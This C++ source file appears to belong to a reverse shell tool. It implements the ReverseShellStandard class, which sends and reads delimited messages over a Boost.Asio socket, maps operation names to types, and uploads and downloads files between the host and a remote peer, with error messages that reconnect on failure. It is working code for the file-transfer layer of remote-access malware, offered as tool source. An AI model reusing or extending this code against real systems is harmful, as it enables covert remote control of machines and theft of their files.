#include <boost/format.hpp>
#include "ReverseShellStandardFunctions.h"
#include "NetworkExcetion.hpp"


ReverseShellStandard::ReverseShellStandard()
	: m_ioService(IoService()), m_socket(m_ioService) {}

ReverseShellStandard::~ReverseShellStandard()
{
	m_socket.close();
	m_ioService.stop();
	m_file.close();
}

void ReverseShellStandard::OpenFileFor(const std::string& filePath, int mode)
{
	m_file.open(filePath, mode);
	if (!m_file)
		throw std::fstream::failure((boost::format("Couldn't open the file: %1%   Reconnecting...") % filePath).str());
}

size_t ReverseShellStandard::Send(const OperationType& operationType)
{
	for (auto const& pair : m_operations)
	{
		if (pair.second == operationType)
			return Send(pair.first);
	}

	throw std::invalid_argument("The OperationType passed isn't a valid argument as it isn't in m_operations");
}

size_t ReverseShellStandard::Send(int numberToSend)
{
	return Send(std::to_string(numberToSend));
}

size_t ReverseShellStandard::Send(const std::string& message)
{
	auto request = message + m_delimiter;
	auto buf = boost::asio::buffer(request, request.size());
	return Send(buf);
}

size_t ReverseShellStandard::Send(const boost::asio::mutable_buffer& t_buffer)
{
	auto bytesSent = boost::asio::write(m_socket, t_buffer, m_errorCode);
	if (m_errorCode)
		throw NetworkExcetion("An exception was thrown while writing to the socket. Reconnecting...");

	return bytesSent;
}

std::string ReverseShellStandard::Response()
{
	auto responseSize = boost::asio::read_until(m_socket, m_responseBuf, m_delimiter, m_errorCode);
	if (m_errorCode)
		throw NetworkExcetion("An exception was thrown while reading from the socket. Reconnecting...");

	return CleanReponse(responseSize);
}


std::string ReverseShellStandard::CleanReponse(size_t responseSize)
{
	std::string response(
		buffers_begin(m_responseBuf.data()),
		buffers_begin(m_responseBuf.data()) + responseSize - m_delimiter.size()
	);
	m_responseBuf.consume(responseSize);

	return response;
}


ReverseShellStandard::OperationType ReverseShellStandard::GetOperationType(const std::string& operation)
{
	if (m_operations.count(operation))
		return m_operations[operation];

	return INVALID;
}

void ReverseShellStandard::UploadFile(const std::string& localFilePath)
{
	auto fileSize = std::filesystem::file_size(localFilePath);
	Send(std::to_string(fileSize));
	OpenFileFor(localFilePath, std::ios::in | std::ios::binary);
	UploadFileBytes(fileSize);
}


void ReverseShellStandard::UploadFileBytes(size_t fileSize)
{
	size_t bytesSent = 0;
	while (fileSize > 0)
	{
		std::array<char, DEFAULT_BUFFER_SIZE> response;
		BytesFromFileToBuffer(response);
		size_t bufferSize(m_file.gcount());
		auto buf = boost::asio::buffer(response.data(), bufferSize);
		bytesSent += Send(buf);

		fileSize -= bufferSize;
	}
	m_file.close();

	std::cout << "Total bytes sent: " << bytesSent << std::endl;
}

void ReverseShellStandard::BytesFromFileToBuffer(std::array<char, DEFAULT_BUFFER_SIZE>& response)
{
	m_file.read(response.data(), response.size());
	if (m_file.fail() && !m_file.eof())
		throw std::fstream::failure("Failed while reading file");
}

void ReverseShellStandard::DownloadFile(const std::string& filePath)
{
	auto amountOfBytes = std::stoi(Response());
	BytesFromSocketToFile(amountOfBytes);
	std::cout << "Finished Downloading " << filePath << std::endl;
}

void ReverseShellStandard::BytesFromSocketToFile(int amountOfBytes)
{
	WriteLeakedBytes();
	while (m_file.tellp() < amountOfBytes)
	{
		std::array<char, DEFAULT_BUFFER_SIZE> response;
		auto bufferSize = std::min(static_cast<int>(m_socket.available()), DEFAULT_BUFFER_SIZE);
		auto buf = boost::asio::buffer(response, bufferSize);
		auto responseSize = boost::asio::read(m_socket, buf, m_errorCode);
		if (m_errorCode)
			throw NetworkExcetion("An exception was thrown while reading from the socket. Reconnecting...");

		m_file.write(response.data(), responseSize);
		std::cout << "Target: " << amountOfBytes << "   Current: " << m_file.tellp() << " Response size: " << responseSize << std::endl;
	}
	std::cout << "Closing file stream" << std::endl;
	m_file.close();
}

void ReverseShellStandard::WriteLeakedBytes()
{
	std::istream requestStream(&m_responseBuf);
	do {
		std::array<char, DEFAULT_BUFFER_SIZE> response;
		requestStream.read(response.data(), response.size());
		std::cout << "==================================== " << requestStream.gcount() << " ====================================" << std::endl;
		m_file.write(response.data(), requestStream.gcount());
	} while (requestStream.gcount() > 0);
}